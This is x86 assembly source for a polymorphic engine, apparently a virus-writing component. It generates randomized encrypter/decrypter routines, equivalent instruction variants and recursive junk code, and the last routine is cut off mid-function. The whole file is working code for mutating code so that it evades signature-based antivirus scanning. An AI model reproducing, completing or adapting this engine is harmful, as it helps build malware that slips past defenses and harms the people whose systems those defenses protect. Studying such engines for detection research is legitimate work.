
;   ---------------------------------------------------------------------
;  ¦¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¦
;  ¦¤¤¤/--------------------------------------------------------------|¤¤¦
;  ¦¤¤/    ##                                                         |¤¤¦
;  ¦¤/    # #  ###  ###  ####   ### #### ###  ##   #####  ###  ####   |¤¤¦
;  ¦¤|   ## #  ## # ## #  ##  ##     ##  ###    #  # ##  ##  # ## ##  |¤¤¦
;  ¦¤|  ###### ## # ## #  ##  ### #  ##   ##  ## #   ##  ##  # ##     |¤¤¦
;  ¦¤| #### #  ## # ## # ####   ### ####  ## ##  ##  ##   ###  ##     |¤¤¦
;  ¦¤|                                                                |¤¤¦
;  ¦¤| ~~~~~~~~~~~~~~~~~~~~~~~~~~~ { PolyMorphic engine © Xž4(k } ~~~ |¤¤¦
;  ¦¤ -----------------------------------------------------------------¤¤¦
;  ¦¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¦
;   ---------------------------------------------------------------------


MAXCRINSTR 				= 10	; Max Crypt-Instructions, cant be <=1 (MAXCRINSTR >= instr > 1)
MAXTRECURSION			= 4		; Max recursions for trash generator

TRASH MACRO
	
	;  TRASH
	call 	@GenTrash
	; ~TRASH
	
endm

FLUSHTRASH MACRO
	
	xor		ecx, ecx
	
endm

.code

; -----------------------------------------------------------------

@GetRegister:		; bl 0/1 - read or get register
	
	or		word ptr[ebp].Registers, 00010000b	; esp 
	cmp		byte ptr[ebp].Registers, 11111111b
	je		@RGFailed
	
@GetReg:

	mov		eax, 8
	call 	@GetRandom
	
	.If		bl == 1
		bts		word ptr[ebp].Registers, ax
	.Else
		bt		word ptr[ebp].Registers, ax
	.EndIf

	jc		@GetReg
	
	ret
	
@RGFailed:
	
	mov		al, -1
	
ret

; -----------------------------------------------------------------

;@FreeRegister:		; dl - number
;	
;	btr		cx, dl
;	
;ret

; -----------------------------------------------------------------

@GenCall:		; AL - type, DL - register, EBX - value
	
	cmp 	al, 0
	je		C0
	
	cmp		al, 1
	je		C1
	
	cmp		al, 2
	je		C2

	ret
	
C0:	; call $+imm32

	mov 	al, 0e8h
	stosb
	mov 	eax, ebx
	stosd
	ret

C1: ; call <reg32>

	mov 	ax, 0d0ffh
	add		ah, dl
	stosw
	ret

C2:	; call dword ptr[<reg32>]

	mov 	ax, 010ffh
	add		ah, dl
	stosw

ret

; -----------------------------------------------------------------

@GenRegPop:		; type random, EDX - register
	
	xor		eax, eax
	mov		al, 2
	call 	@GetRandom
	
	test 	eax, eax
	jnz		PO1
	
PO0: ; pop <reg32>

	mov 	al, 58h
	add		al, dl
	stosb
	
	TRASH
	
	ret
	
PO1: ; <mov> <reg32>, [esp]
	 ; <add> esp, 4
	push	edx
	push	ebx
	
	mov		dh, 0
	call 	@GenRegMovEsp
	
	TRASH
	
	mov		dl, 4	
	mov 	ebx, 4
	call 	@GenImmAdd
	
	TRASH
	
	pop		ebx
	pop		edx
ret

; -----------------------------------------------------------------

@GenRegPush:		; EDX - register

	xor		eax, eax
	mov		al, 2
	call 	@GetRandom
	
	test 	eax, eax
	jnz		PU1
	
PU0: ; push <reg32>

	mov 	al, 50h
	add		al, dl
	stosb
	
	TRASH
	
	ret
	
PU1: ; <add> esp, -4
	 ; <mov> [esp], <reg32>
	
	push	edx
	
	push	edx
	mov 	dl, 4
	mov 	ebx, -4
	call 	@GenImmAdd	
	pop		edx
	
	TRASH
	
	mov		dh, 1
	call 	@GenRegMovEsp
	
	TRASH
	
	pop 	edx
ret
; -----------------------------------------------------------------

@GenRegClear:		; dl - register
	
	mov		eax, 6
	call 	@GetRandom
	
	cmp 	al, 0
	je		RC0
	
	cmp		al, 1
	je		RC1
	
	cmp		al, 2
	je		RC2
	
	cmp		al, 3
	je		RC3	
	
	cmp		al, 4
	je		RC4
	
	cmp		al, 5
	je		RC5		
	
RC0: ; xor reg32, reg32

	mov 	ax, 0c033h
	or 		ah, dl
	ror 	ah, 3
	or 		ah, dl
	rol 	ah, 3
	stosw
	
	TRASH
	
	ret
	
RC1: ; and reg32, 0
	
	mov 	ax, 0e083h
	add 	ah, dl
	stosw
	mov 	al, 0
	stosb
	
	TRASH
	
	ret
	
RC2: ; sub reg32, reg32
	
	mov 	ax, 0c02bh
	or 		ah, dl
	ror 	ah, 3
	or 		ah, dl
	rol 	ah, 3
	stosw	
	
	TRASH
	
	ret
	
RC3: ; lea reg32, [0]
	
	mov 	ax, 058dh
	
	ror		ah, 3
	or		ah, dl
	rol		ah, 3
	stosw
	
	xor 	eax, eax
	stosd
	
	TRASH
	
	ret
	
RC4: ; push 0
	 ; <pop> reg32
	 
	mov 	ax, 006ah
	stosw
	
	TRASH
	
	call 	@GenRegPop
	
	TRASH
	
	ret
	
RC5: ; imul reg32, reg32, 0
	
	mov 	ax, 0c06bh
	
	or 		ah, dl
	ror 	ah, 3
	or 		ah, dl
	rol 	ah, 3
	stosw
	
	xor 	al ,al
	stosb
	
	TRASH
	
ret

; -----------------------------------------------------------------

@GenDec:		; type random, DL - dest, ESP NOT SUPPORTED!!

	mov		eax, 3
	call 	@GetRandom
	
	cmp 	al, 0
	je		@D0
	
	cmp 	al, 1
	je		@D1
	
	cmp 	al, 2
	je		@D2
	
	
@D0: ; dec <reg32>
	
	mov 	al, 48h
	add 	al, dl
	stosb
	
	TRASH
	
	ret
	
@D1: ; sub <reg32>, 1
	
	mov 	ax, 0e883h
	add		ah, dl
	stosw
	
	mov		al, 1
	stosb
	
	TRASH
	
	ret
	
@D2: ; lea <reg32>, [<reg32> - 1]
	
	mov		ax, 408dh
	or 		ah, dl
	ror 	ah, 3
	or 		ah, dl
	rol 	ah, 3
	stosw
	
	mov		al, 0ffh
	stosb
	
	TRASH
	
ret

; -----------------------------------------------------------------

@GenRegMovEsp:		; DL - dest

	mov		eax, 4
	call 	@GetRandom
	
	cmp 	al, 0
	je		RME0
	
	cmp		al, 1
	je		RME1
	
	cmp		al, 2
	je		RME2
	
	cmp		al, 3
	je		RME3
	
	
RME0: ; mov <reg32>, [esp]
	  ; OR
	  ; mov [esp], <reg32> 

	mov 	ax, 0048Bh
	ror 	ah, 3
	or  	ah, dl
	rol 	ah, 3
	
		test	dh, dh
		jz		@f
		xor	al, 10b
	@@:
	
	stosw
	
	
	mov 	al, 24h
	stosb
	
	TRASH
	
	ret
	
RME1: ; <clear> <dest>
	  ; xor <dest>, [esp]
	  ; OR 
	  ; xor [esp], <dest>
	 
		test	dh, dh
		jz		@f
		jmp @GenRegMovEsp
	@@:	
	
	call 	@GenRegClear
	
	TRASH
	
	mov 	ax, 00433h
	ror 	ah, 3
	or 		ah, dl
	rol 	ah, 3
	stosw
	
	mov 	al, 24h
	stosb
	
	TRASH
	
	ret
	
RME2: ; <clear> eax, eax
	  ; or eax, [esp]
	  ; OR
	  ; or [esp], eax
	 
		test	dh, dh
		jz		@f
		jmp 	@GenRegMovEsp
	@@:	
	
	call 	@GenRegClear
	
	TRASH
	
	mov 	ax, 0040Bh

	ror 	ah, 3
	or 		ah, dl
	rol 	ah, 3
	stosw	

	mov 	al, 24h
	stosb
	
	TRASH
	
	ret
	
RME3: ; or eax, [esp]
	  ; and eax, [esp]
	  ; OR
	  ; or [esp], eax
	  ; and [esp], eax
	 
	mov 	ax, 0040bh
	ror 	ah, 3
	or 		ah, dl
	rol 	ah, 3
	
		test	dh, dh
		jz		@f
		xor	al, 2
	@@:
	
	stosw	
	mov 	al, 24h
	stosb
	
	TRASH
	
	mov 	ax, 00423h
	ror 	ah, 3
	or 		ah, dl
	rol 	ah, 3
	
	test	dh, dh
	jz		@f
		xor	al, 2
	@@:
	
	stosw	
	
	mov 	al, 24h
	stosb
	
	TRASH
	
ret

; -----------------------------------------------------------------

@GenRegMov:		; EBX - type, DH - left, DL - right

	mov		eax, 5
	call 	@GetRandom
	
	cmp 	al, 0
	je		RM0
	
	cmp		al, 1
	je		RM1
	
	cmp		al, 2
	je		RM2
	
	cmp		al, 3
	je		RM3
	
	cmp		al, 4
	je		RM4
	
	
RM0: ; 0. mov <reg32>, <reg32>
	 ; 1. mov <reg32>, [<reg32>]

	mov 	ax, 0C08Bh
	or		ah, dl
	ror 	ah, 3
	or  	ah, dh
	rol 	ah, 3
	
		cmp 	ebx, 1
		jnz 	@f
		sub		ah, 0c0h
		
			cmp dl, 5
			jnz	@f
			add	ah, 40h	; for [ebp]
		
		@@:	
	stosw
	
	.if ebx == 1 && dl == 5
		
		xor al, al	; for [ebp]
		stosb
		
	.endif
	
	TRASH
	
	ret
	
RM1: ; <clear> eax
	 ; 0. xor eax, ecx
	 ; 1. xor eax, [ecx]
	 
	xchg 	dh, dl
	call 	@GenRegClear
	xchg 	dh, dl
	
	TRASH
	
	mov 	ax, 0c033h
	or 		ah, dl
	ror 	ah, 3
	or 		ah, dh
	rol 	ah, 3
	
		cmp 	ebx, 1
		jnz 	@f
		sub		ah, 0c0h
		
			cmp dl, 5
			jnz	@f
			add	ah, 40h	; for [ebp]
		
		@@:	
	stosw
	
	.if ebx == 1 && dl == 5
		
		xor al, al	; for [ebp]
		stosb
		
	.endif
	
	TRASH
	
	ret
	
RM2: ; <clear> eax
	 ; 0. or eax, ecx
	 ; 1. or eax, [ecx]
	 
	xchg 	dh, dl
	call 	@GenRegClear
	xchg 	dh, dl
	
	TRASH
	
	mov 	ax, 0c009h

	or 		ah, dh
	ror 	ah, 3
	or 		ah, dl
	rol 	ah, 3

		cmp 	ebx, 1
		jnz 	@f
		xor		ah, ah
		or		al, 2
		
		or 		ah, dl
		ror 	ah, 3
		or 		ah, dh
		rol 	ah, 3
		
			cmp dl, 5
			jnz	@f
			add	ah, 40h	; for [ebp]
		
		@@:
	
	stosw	
	
	.if ebx == 1 && dl == 5
		
		xor al, al	; for [ebp]
		stosb
		
	.endif
	
	TRASH
	
	ret
	
RM3: ; <clear> a
	 ; <radd> a, b
	 ; OR
	 ; <clear> a
	 ; <rpush> b
	 ; <rmov> b, [b]
	 ; <radd> a, b
	 ; <rpop> b
	
	xchg 	dh, dl
	call 	@GenRegClear
	xchg 	dh, dl
	
	TRASH
	
	test	ebx, ebx
	jz		@f
	
		call 	@GenRegPush
		
		TRASH
		
		push 	edx
		mov 	dh, dl
		call 	@GenRegMov
		pop 	edx
		
		TRASH
		
		call 	@GenRegAdd
		
		TRASH
		
		call 	@GenRegPop
		
		ret
	
	@@:
	call 	@GenRegAdd
	
	TRASH
	
	ret
	
RM4: ; <rpush> reg32
	 ; <rpop> reg32
	
	.if ebx == 1
		
		mov		ax, 30ffh
		add		ah, dl
		
		.if dl == 5
			
			add		ah, 40h
			stosw
			
			xor		al, al
			stosb
			
		.else
			
			stosw
			
		.endif
		
	.else
		
		call 	@GenRegPush 
		
	.endif	
	 
	TRASH
	 
	xchg	dh, dl
	call 	@GenRegPop
	xchg	dh, dl
	
	TRASH
	
	ret
	
ret

; -----------------------------------------------------------------

@GenImmMov:		; EBX - val, DL - left
	
	mov		eax, 5
	call 	@GetRandom
	
	cmp 	al, 0
	je		IM0
	
	cmp		al, 1
	je		IM1
	
	cmp		al, 2
	je		IM2
	
	cmp		al, 3
	je		IM3
	
	cmp		al, 4
	je		IM4

	
IM0: ; mov <reg32>, <imm32>

	mov 	al, 0b8h
	add		al, dl
	stosb
	mov		eax, ebx
	stosd
	
	TRASH
	
	ret
	
IM1: ; <clear> <dest>
	 ; <iradd> <dest>, <val>

	call 	@GenRegClear
	TRASH
	call	@GenImmAdd
	TRASH
	
	ret
	
IM2: ; <clear> <dest>
	 ; <iradd> <dest>, -<val>
	 ; neg	   <dest>

	call 	@GenRegClear
	TRASH
	
	neg		ebx
	call	@GenImmAdd
	neg		ebx
	
	TRASH
	
	mov		ax, 0d8f7h
	add		ah, dl
	stosw
	
	TRASH
	
	ret
	
IM3: ; lea <dest>, [<val>]

	mov 	ax, 058dh
	ror 	ah, 3
	or 		ah, dl
	rol 	ah, 3
	stosw
	
	mov 	eax, ebx
	stosd
	
	TRASH
	
	ret
	
IM4: ; push <val>
	 ; pop <dest>

	mov 	al, 68h
	stosb
	mov 	eax, ebx
	stosd
	
	TRASH
	
	call	@GenRegPop

	TRASH

ret

; -----------------------------------------------------------------

@GenRegAdd:		; type random, DH - left, DL - right

	mov		eax, 4
	call 	@GetRandom
	
	cmp 	al, 0
	je		RA0
	
	cmp		al, 1
	je		RA1
	
	cmp		al, 2
	je		RA2
	
	cmp		al, 3
	je		RA3	
	
RA0: ; add <reg32>, <reg32>

	mov 	ax, 0c003h
	add  	ah, dl
	ror  	ah, 3
	or   	ah, dh
	rol  	ah, 3
	stosw
	
	TRASH
	
	ret
	
RA1: ; neg src
	 ; sub dest, src
	 ; neg src

	mov		ax, 0d8f7h
	add		ah, dh
	stosw
	
	TRASH
	
	mov		ax, 0c02bh
	add		ah, dh
	or 		ah, dl
	ror 	ah, 3
	or 		ah, dh
	rol 	ah, 3
	stosw
	
	TRASH
	
	mov		ax, 0d8f7h
	add		ah, dh
	stosw
	
	TRASH
	
	ret
	
RA2: ; xadd dest, src

	mov 	ax, 0c10fh
	stosw
	mov 	al, 0c0h
	or 		al, dh
	ror 	al, 3
	or 		al, dl
	rol 	al, 3
	stosb
	
	TRASH
	
	ret
	
RA3: ; lea dest, [dest + src]

	.if dl == 4 || dl == 5 || dh == 4 || dh == 5	; not support ebp, esp
		
		jmp	@GenRegAdd
		
	.endif

	mov		al, 8dh
	stosb

	mov 	ax, 00004h

	or 		ah, dh
	ror 	ah, 3
	or 		ah, dl
	rol 	ah, 3

	ror 	al, 3
	or 		al, dh
	rol 	al, 3

	stosw
	
	TRASH
	
ret

; -----------------------------------------------------------------

@GenImmAdd:		; type random, DL - dest, EBX - value

	mov		eax, 3
	call 	@GetRandom
	
	cmp 	al, 0
	je		IA0
	
	cmp		al, 1
	je		IA1
	
	cmp		al, 2
	je		IA2
	
	
IA0: ; add <reg32>, imm32
	 ; add eax, imm32

	test	dl, dl
	jnz 	@f
	
	mov 	al, 5h				; for EAX
	stosb
	
	mov 	eax, ebx
	stosd
	
	TRASH
	
	ret
	
  @@:
	mov		ax, 0c081h
	add		ah, dl
	stosw
	mov 	eax, ebx
	stosd
	
	TRASH
	
	ret
	
IA1: ; lea <reg32>, [<reg32>+imm32]
	mov 	ax, 808dh

	or 		ah, dl
	ror 	ah, 3
	or 		ah, dl
	rol 	ah, 3
	stosw
	
	cmp		dl, 4		; Check esp
	jne		@f
	mov		al, 24h
	stosb
	@@:
	
	mov 	eax, ebx
	stosd
	
	TRASH
	
	ret
	
IA2: ; sub reg32, -imm32 

	test	dl, dl
	jnz 	@f

	mov 	al, 02dh			; for EAX
	stosb
	
	neg 	ebx
	mov 	eax, ebx
	stosd
	neg 	ebx

	TRASH

	ret

@@:

	mov 	ax, 0e881h
	add 	ah, dl
	stosw
	
	neg 	ebx
	mov 	eax, ebx
	stosd
	neg 	ebx

	TRASH
ret

; -----------------------------------------------------------------

@GenCmp0:		; type random, DL - dest

	mov		eax, 9
	call 	@GetRandom
	
	.if	al == 2 || al == 3
		
		jmp	@GenCmp0
		
	.endif
	
	cmp 	al, 8
	je		@CMTEST
	
	; 1000 0011 |  | 0000 0000
	;					   num reg
	; add 	<reg32>, 0  11 000 000
	; or 	<reg32>, 0  11 001 000
	; adc 	<reg32>, 0  11 010 000
	; sbb 	<reg32>, 0  11 011 000
	; and 	<reg32>,-1  11 100 000
	; sub 	<reg32>, 0  11 101 000
	; xor 	<reg32>, 0  11 110 000
	; cmp 	<reg32>, 0  11 111 000
	
	xchg	ah, al
	shl		ah, 3
	or 		ax, 0c083h
	or		ah, dl
	stosw
	
	xor 	al, al
	
	.If		(ah >= 0e0h) && (ah < 0e8h)	; AND
		
		dec al
		
	.EndIF
	
	stosb
	ret

@CMTEST:	; test 		<reg32>, <reg32>

	mov		ax, 0c085h
	or		ah, dl
	ror 	ah, 3
	or 		ah, dl
	rol 	ah, 3
	
	stosw
ret

; -----------------------------------------------------------------

@GenMathLogicReg:		; type random, DH - left, DL - right

	mov		eax, 8
	call 	@GetRandom
	
	; <op> <reg32>, <reg32>. For 03c0h
	; add	00 000 011 11 000 000 - lr, 0
	; or	00 001 001 11 000 000 - rl, 1
	; adc	00 010 001 11 000 000 - rl, 2
	; sbb	00 011 011 11 000 000 - lr, 3
	; and	00 100 001 11 000 000 - rl, 4
	; sub	00 101 011 11 000 000 - lr, 5
	; xor	00 110 011 11 000 000 - lr, 6
	; cmp	00 111 011 11 000 000 - lr, 7

	cmp		al, 4	; AND

	pushfd
	shl		al, 3
	or		ax, 0c003h
	popfd
	
	jne		@f
		xor	al, 2
	@@:
	
	or		ah, dh
	ror 	ah, 3
	or 		ah, dl
	rol 	ah, 3
	
	stosw
	
ret

; -----------------------------------------------------------------

@GenMathLogicImm:		; type random, DH - crypt flag, DL - dest, EBX - val (imm8 if EBX < FF, unsigned)

	mov		eax, 8
	call 	@GetRandom
	
	.if dh != 0 && (eax != 0 && eax != 5 && eax != 6);	Only inversable op
		
		jmp	@GenMathLogicImm
		
	.endif
	
	; add 	<reg32>, x	0
	; or 	<reg32>, x	1
	; adc	<reg32>, x	2
	; sbb	<reg32>, x	3
	; and 	<reg32>, x	4
	; sub 	<reg32>, x	5
	; xor 	<reg32>, x	6
	; cmp 	<reg32>, x	7
	
	; 1 byte
	; 10000011 11 xxx 000
	
	; 4 byte
	; 10000001 11 xxx 000
	
	; 4 byte eax
	; 00 xxx 101
	
	; where xxx - 0-7
	
	
	xchg	al, ah
	shl		ah, 3
	or 		ax, 0c083h
	
	cmp		dh, 2	; itz [reg32]
	jne		@math_not_addr
		xor	ah, 0c0h
		
		cmp		dl, 5			; EBP
		jne		@f
		add 	ah, 40h
		@@:
		
	@math_not_addr:
	
	or		ah, dl
	
	cmp		ebx, 0ffh
	ja		@MLI32
	
	stosw
	
	.if dh == 2 && dl == 5	; EBP
		xor		al, al
		stosb
	.endif
	
	mov		al, bl
	stosb
	
	ret
	
@MLI32:

	xor		al, 2
	
	.if dh == 2 || dl ; itz [reg32] or not eax
		
		stosw
		
		.if dh == 2 && dl == 5	; EBP
			xor		al, al
			stosb
		.endif
		
		jmp	@MLI32VAL
		
	.endif
	
	xchg	al, ah
	
	shl		al, 2
	shr		al, 2	; zero last 2 bits
	or		al, 5
	stosb
	
@MLI32VAL:
	mov 	eax, ebx
	stosd
	
ret

; -----------------------------------------------------------------

@GenShift:		; random value, DH - crypt flag, DL - dest

	mov		eax, 4
	call 	@GetRandom
	
	; For c1e0, c1c0:
	; rol, ror, rcl, rcr	1100 0001 110 xx 000
	; shl, shr, sal, sar	1100 0001 111 xx 000
	
	xchg	ah, al
	shl		ah, 3
	or 		ax, 0c0c1h

	cmp		dh, 2			; itz [reg32]
	jne		@f
		xor	ah, ah
	@@:
	
	or		ah, dl
	
	
	; Type of shift
	push	ebx
	xchg	eax, ebx
	mov		eax, 2			; cycle or linear shift?
	call 	@GetRandom
	
	cmp		dh, 0			; itz crypt instr (only cycle)
	jz		@f
		xor	al, al
	@@:
	
	shl		al, 5
	or		bh, al
	xchg	eax, ebx
	pop		ebx
	; -------------
	
	cmp		dh, 2
	jne		@f
		cmp		dl, 5			; EBP
		jne		@f
			add 	ah, 40h
			stosw
			
			xor		al, al
			stosb
			
		jmp	@shift_val
	@@:
	
	stosw
	
	@shift_val:
	
	mov		eax, 32
	call 	@GetRandom
	stosb
	
ret

; -----------------------------------------------------------------

@GenCrypt:		; type random, DH - addressation flag, DL - register, edi - Decrypt buffer, esi - Encrypt buffer

	push	ebp
	push	ebx
	push	ecx

	mov		eax, MAXCRINSTR
	call 	@GetRandom			; Instructions amount
	
	inc		eax
	xchg 	eax, ecx			; In ecx - instr count
	mov		ebx, ecx			; Save ecx in ebp
	xchg	edi, esi			; Generate Encrypter First
	
	@GenECrLoop:				; Generate Encrypter code
		
		push	ebx
		call 	@GenCryptInst
		pop		ebx
		push	eax
		
	loop @GenECrLoop
	
	mov 	al, 0c3h			; retn
	stosb
	
	dec		edi
	
	xchg	edi, esi			; @ no gen Decrypter
	xchg	ebx, ecx			; Restore ecx
	
	@InvertCr:					; Invert Encrypter Code into Decrypter code
		
		pop		ebx				; Instr len, and istr type in stack
		push	ecx
		movzx	ecx, bl			; ecx = ebx = instr len
		
		sub		esi, ecx
		rep 	movsb
		movzx	ecx, bl	
		sub		esi, ecx
		
		; 	in bh - type of op code
		;	Change OP-codes
		test	bh, bh
		jz		Cr_correct_neednt
			
			.if bh <= 4
				
				call	@InvertMath
				
			.else
				
				call	@InvertShift
				
			.endif
		
		Cr_correct_neednt:
		
		push 	ecx
		FLUSHTRASH
		TRASH
		pop		ecx
		
		pop		ecx
		
	loop @InvertCr

	pop		ecx
	pop		ebx
	pop		ebp

ret

; -----------------------------------------------------------------

@GenCryptInst:		; type random, IN: DH - addressation flag, DL - register, edi - Encrypt buffer, esi - Decrypt buffer
	
	; About DH flag
	;
	; dh == 0 : w/o adressation and uninversable operators
	; dh == 1 : w/o adressation
	; dh == 2 : with adressation


	mov		eax, 4
	call 	@GetRandom
	
	cmp 	al, 0
	je		CI0
	
	cmp		al, 1
	je		CI1
	
	cmp		al, 2
	je		CI2
	
	cmp		al, 3
	je		CI3
	

	
CI0:
	xor 	eax, eax
	call 	@GetRandom
	xchg	eax, ebx
	
	call	@GenMathLogicImm
	
	xor 	eax, eax
	
	.if	(dl != 0 || dh == 2) && ebx > 0ffh
		
		mov		al, 6
		mov		ah, 1
		
	.elseif ebx > 0ffh
		
		mov		al, 5
		mov		ah, 1
		
	.else
		
		mov		al, 3
		mov		ah, 3
		
	.endif
	
	jmp		@CR_END
	
CI1:
	call	@GenShift
	
	xor 	eax, eax
	mov		al, 3
	
	mov		ah, 5
	
	jmp		@CR_END
	
CI2: ; neg <reg32>

	mov 	ah, 8h
	xor 	al, al
	jmp 	CII

CI3: ; not <reg32>
 
 	xor 	ax, ax
 	
CII: ; II part crypt instr

	add 	ax, 0d0f7h
	add		ah, dl
	
	cmp		dh, 2			; itz [reg32]
	jne		@f
		xor	ah, 0c0h
		
		cmp		dl, 5			; EBP
		jne		@f
		or		ah, 45h
		stosw
		
		xor 	al, al
		stosb
		
		jmp		CII_end
	@@:
	
	stosw
	
	CII_end:
	
	xor 	eax, eax
	mov		al, 2
	
@CR_END:

	.if dh == 2 && dl == 5
		
		inc al
		
		.if ah != 0
			
			inc	ah
		.endif
		
	.endif

ret
; -----------------------------------------------------------------

@InvertMath:	; bl - op. length
	
	pushad
	
	.if bh <= 2
		
		sub		edi, 8
		
	.elseif bh <= 4
		
		sub		edi, 5
		
	.endif
	
	.if bh == 4 || bh == 2
		
		dec		edi
		
	.endif
	
	mov		esi, edi
	lodsd				; edit only last 4 bytes, no more
	
	; -------------
	; Check OP-Code
	; -------------
	
	xor		edx, edx
	
	rol		eax, 2
	shld	edx, eax, 3
	shl		eax, 3

	; Invert
	.if		dl == 0 || dl == 5	; and, sub
		
		xor		dl, 5	; sub -> and || and -> sub
		
	.elseif dl == 2 || dl == 3	; adc, sbb
		
		xor		dl, 1	; adc -> sbb || sbb -> adc
		
	.endif
	
	; Restore
	shrd	eax, edx, 3
	ror		eax, 2
	
	; Accept Changes
	stosd
	
	popad
	
ret
; -----------------------------------------------------------------

@InvertShift:	; bl - op. length
	
	pushad
	
	sub		edi, 5
	
	.if bh == 6
		
		dec		edi
		
	.endif
	
	mov		esi, edi
	lodsd				; edit only last 4 bytes, no more
	
	; -------------
	; Check OP-Code
	; -------------
	
	xor		edx, edx
	rol		eax, 2
	shld	edx, eax, 3
	shl		eax, 3
	

	; Invert
	.if		dl == 0 || dl == 2	; to left shifting
		
		xor		dl, 1	; invert shifting
		
	.endif
	
	; Restore
	shrd	eax, edx, 3
	ror		eax, 2
	
	; Accept Changes
	stosd
	
	popad
	
ret
; -----------------------------------------------------------------

@GenJZNZ:		; long or short jump, IN: dh - forward(0) || back(1), dl - jz(0) || jnz(1), ebx - jump length

	.If (ebx < 07dh)
		
		mov 	al, 74h
		
		test	dl, dl	; jnz ?
			jz		@f
			inc		al
		@@:
		stosb
		
		
		mov 	al, bl
		
		.if (dh == 1)
			
			add		al, 2
			neg		al
			
		.endif
		
		stosb
		
	.Else
		
		mov 	ax, 840fh
		
		test	dl, dl
			jz		@f
			inc		ah
		@@:
		stosw
		
		mov		eax, ebx
		
		.if (dh == 1)
			
			add		eax, 6
			neg		eax
			
		.endif
		
		stosd
		
	.EndIf
	
ret

; -----------------------------------------------------------------

@GenEspOff:		; IN: dl - dest, EBX - offset
	
	; Generates lea, <reg32>, [esp + <offset>]
	mov 	ax, 848dh
	ror 	ah, 3
	or 		ah, dl
	rol 	ah, 3
	stosw
	
	mov 	al, 24h
	stosb
	
	mov 	eax, ebx
	stosd
	
ret

; -----------------------------------------------------------------

@GenTrash:		; USES: EAX, EDX(used reg-s), ECX(recursion), EBX(val), EDI(buff)

	; Generates a trash code (recursionally)
	; Arithmetic and Logic
	; Shift
	; Move
	; Especially Adding
	; Clear
	; Stack
	; One byte instructions (?)
	
	push	edx
	push	ebx
	
	cmp		ecx, MAXTRECURSION
	je		@TEnd
	inc		ecx
	
@TGen:
	xor		ebx, ebx
	
	call	@GetRegister
	xchg	dl, al
	
	call	@GetRegister
	xchg	dh, al
	
	xor		eax, eax
	call 	@GetRandom
	xchg	ebx, eax
	
	mov		eax, 9
	call 	@GetRandom
	
	.if eax == 1 || eax == 2
		
		xor dh, dh
		
	.elseif eax == 3
		
		xor ebx, ebx
		
	.endif
	
	imul	eax, 6
	add		eax, 7 ;@TInstructions - @TOffset - 5
	
	
@TOffset:
	call	$+5
	add		dword ptr[esp], @TEnd - @TOffset - 5	; Points to TEnd
	
	call 	$+5
	add		dword ptr[esp], eax
	retn

@TEnd:
	pop		ebx
	pop		edx
	
	retn

@TInstructions:
	

	
	call @GenMathLogicReg	; ok
	ret
	call @GenMathLogicImm	; dh must be zero
	ret
	call @GenShift			; dh must be zero
	ret
	call @GenRegMov			; EBX must be zero
	ret
	call @GenImmMov			; ok
	ret
	call @GenRegAdd			; ok
	ret
	call @GenImmAdd			; ok
	ret
	call @GenRegClear		; ok
	ret
	call @GenRegPush		; ok
	call @GenRegPop			; ok
	
retn

; -----------------------------------------------------------------

@GenVarialRetn:

	; -------------------------------------------------------
	; retn or jmp
	; -------------------------------------------------------
	xor		eax, eax
	inc		eax
	inc		eax
	call 	@GetRandom

	test	eax, eax
	jnz		@GVJR_RETN
	
	; -------------------------------------------------------
	; jmp <reg>
	; -------------------------------------------------------
	
	xor 	ebx, ebx
	inc 	ebx
	
	call	@GetRegister
	xchg	al, dl
	
	call	@GenRegPop
	
	FLUSHTRASH
	TRASH	
	
	mov		ax, 0e0ffh
	add		ah, dl
	stosw
	
	FLUSHTRASH
	TRASH
	
	ret
	
@GVJR_RETN:
	
	; -------------------------------------------------------
	; retn
	; -------------------------------------------------------

	mov		al, 0c3h
	stosb
	
	FLUSHTRASH
	TRASH

ret

; -----------------------------------------------------------------
; NOT USED!

@GenVarialJmp:	; Always far jump, DL - register, EBX - destination. Need temp buffer - esi (2000h).
	
	; <imov>	<reg>, math(<value>)
	; <math>	<reg>, <value2>
	; 
	; ------------------------------
	;
	; <rpush>
	; <ret>
	; 
	; [OR]
	;
	; jmp <reg>
	
	; -------------------------------------------------------
	; Splitting buffer in2 2 parts
	; -------------------------------------------------------
	push	edx
	push	edi
	lea		edi, [esi+1000h]	; Split bufer into 2 parts
	push	edi
	mov		dh, 1
	
	
	pop		ecx
	xchg	edi, ecx
	sub		ecx, edi			; Get Decrypt Code size
	
	pop		edi
	pop		edx
	; -------------------------------------------------------
	; esi - points to Crypt procedure
	; [esi+1000h] - Decrypter with trash
	; edx - register
	; -------------------------------------------------------
	
	; -------------------------------------------------------
	; We dont no what register returned by @GetRegister.
	; To check it, many checkings needly.
	; Instead of this im doing next:
	; Pushing all registers in stack, 
	; then changing that register, what i need, 
	; then getting data from stack...
	; Result - needly register contains crypting value.
	; -------------------------------------------------------
	
	pushad	; Save all registers
	movzx	eax, dl					; register in eax
	inc		eax						; because min value is 1
	neg		eax						; inverse 4 addressation	
	
	push	eax						; Reg Value (num.)
	push	esi						; Crypt Proc (for retn)
	
	; -------------------------------------------------------
	pushad	
	mov		[esp+32+eax*4], ebx		; Set Crypting Reg
	popad
	; -------------------------------------------------------
	
	;call	dword ptr[esp]			; Crypt. We dont no what reg used.
	
	add		esp, 4					; in stack Crypt proc addr
	pushad
	mov		eax, [esp+32]			; no in eax - reg num.
	mov		ecx, [esp+32+eax*4]		; Get Crypted Value
	mov		[esp+32+20], ecx		; Set Crypted Value to EBX
	popad							; Restore all registers
	pop		eax
	popad							; Restore all registers, except ebx
	; -------------------------------------------------------
	
	call	@GenImmMov				; Move Crypted Value
	
	lea		esi, [esi+1000h]
	;rep		movsb					; Write Decrypter code
	
	FLUSHTRASH
	TRASH
	
	; -------------------------------------------------------
	; retn or jmp
	; -------------------------------------------------------
	xor		eax, eax
	inc		eax
	inc		eax
	call 	@GetRandom
	; -------------------------------------------------------
	
	; -------------------------------------------------------
	test	eax, eax
	jnz		@GVJ_RETN
	
	; -------------------------------------------------------
	; jmp <reg>
	; -------------------------------------------------------
	mov		ax, 0e0ffh
	add		ah, dl
	stosw
	
	;FLUSHTRASH
	;TRASH
	
	ret
	
@GVJ_RETN:
	
